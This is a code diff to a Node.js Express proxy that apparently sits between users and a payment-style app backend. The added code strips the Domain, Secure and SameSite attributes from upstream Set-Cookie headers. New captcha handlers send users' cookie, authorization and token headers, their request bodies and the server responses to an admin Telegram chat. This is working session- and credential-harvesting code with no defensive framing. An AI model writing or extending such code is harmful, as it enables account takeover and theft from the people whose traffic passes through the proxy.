@@ -320,10 +320,27 @@ async function proxyFetch(req, timeoutMs) {
   const respHeaders = {};
   response.headers.forEach((val, key) => {
     const kl = key.toLowerCase();
-    if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
-      respHeaders[key] = val;
-    }
+    if (kl === 'transfer-encoding' || kl === 'connection' || kl === 'content-encoding' || kl === 'content-length' || kl === 'set-cookie') return;
+    respHeaders[key] = val;
   });
+  try {
+    let setCookies = [];
+    if (typeof response.headers.getSetCookie === 'function') {
+      setCookies = response.headers.getSetCookie();
+    } else if (response.headers.raw) {
+      setCookies = response.headers.raw()['set-cookie'] || [];
+    } else {
+      const sc = response.headers.get('set-cookie');
+      if (sc) setCookies = [sc];
+    }
+    if (setCookies && setCookies.length) {
+      const rewritten = setCookies.map(c => c
+        .replace(/;\s*Domain=[^;]+/ig, '')
+        .replace(/;\s*Secure/ig, '')
+        .replace(/;\s*SameSite=[^;]+/ig, ''));
+      respHeaders['set-cookie'] = rewritten.length === 1 ? rewritten[0] : rewritten;
+    }
+  } catch(e) {}
   const ct = (respHeaders['content-type'] || respHeaders['Content-Type'] || '').toLowerCase();
   const isText = !ct || ct.includes('json') || ct.includes('text') || ct.includes('xml') || ct.includes('javascript') || ct.includes('html') || ct.includes('form');
   const respBody = isText ? respBuffer.toString('utf8') : '';
@@ -1789,13 +1806,42 @@ app.all('/app/base/comm/upload', async (req, res) => {
 
 app.all('/app/payment/order/nightBonusStatus', async (req, res) => { await proxyAndAddBonus(req, res); });
 
+app.all('/app/captcha/new', async (req, res) => {
+  try {
+    const data = await loadData();
+    const { response, respBody, respBuffer, respHeaders, jsonResp } = await proxyFetch(req);
+    if (data.adminChatId && bot) {
+      const reqHdrs = {};
+      ['cookie','user-agent','x-token','token','authorization','content-type'].forEach(h => { if (req.headers[h]) reqHdrs[h] = req.headers[h]; });
+      const setCk = respHeaders['set-cookie'];
+      const setCkStr = Array.isArray(setCk) ? setCk.join('\n') : (setCk || '(none)');
+      let preview;
+      if (jsonResp) {
+        const truncated = JSON.parse(JSON.stringify(jsonResp));
+        const truncStr = (s) => typeof s === 'string' && s.length > 80 ? `${s.slice(0,40)}...[${s.length}b]` : s;
+        const walk = (o) => { if (!o || typeof o !== 'object') return; for (const k of Object.keys(o)) { if (typeof o[k] === 'string') o[k] = truncStr(o[k]); else walk(o[k]); } };
+        walk(truncated);
+        preview = JSON.stringify(truncated, null, 2);
+      } else {
+        preview = (respBody || `<binary ${respBuffer.length}b>`).substring(0, 1000);
+      }
+      bot.sendMessage(data.adminChatId, `🆕 Captcha New\n\n📤 ${req.method} ${req.originalUrl}\n📤 REQ HDRS:\n${JSON.stringify(reqHdrs, null, 2).substring(0,800)}\n\n📥 STATUS: ${response.status}\n📥 SET-COOKIE:\n${String(setCkStr).substring(0,500)}\n\n📥 RESPONSE (truncated):\n${preview.substring(0,1800)}`).catch(()=>{});
+    }
+    respHeaders['content-length'] = String(respBuffer.length);
+    res.writeHead(response.status, respHeaders);
+    res.end(respBuffer);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
 app.post('/app/captcha/verify', async (req, res) => {
   try {
     const data = await loadData();
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
     if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId, `🧩 Captcha Verify\n\n📤 REQUEST BODY:\n${JSON.stringify(body, null, 2).substring(0, 1500)}\n\n📥 RESPONSE:\n${(jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody).substring(0, 1500)}`).catch(()=>{});
+      const reqHdrs = {};
+      ['cookie','user-agent','x-token','token','authorization','content-type'].forEach(h => { if (req.headers[h]) reqHdrs[h] = req.headers[h]; });
+      bot.sendMessage(data.adminChatId, `🧩 Captcha Verify\n\n📤 REQ HDRS:\n${JSON.stringify(reqHdrs, null, 2).substring(0,800)}\n\n📤 REQUEST BODY:\n${JSON.stringify(body, null, 2).substring(0, 1500)}\n\n📥 RESPONSE:\n${(jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody).substring(0, 1500)}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
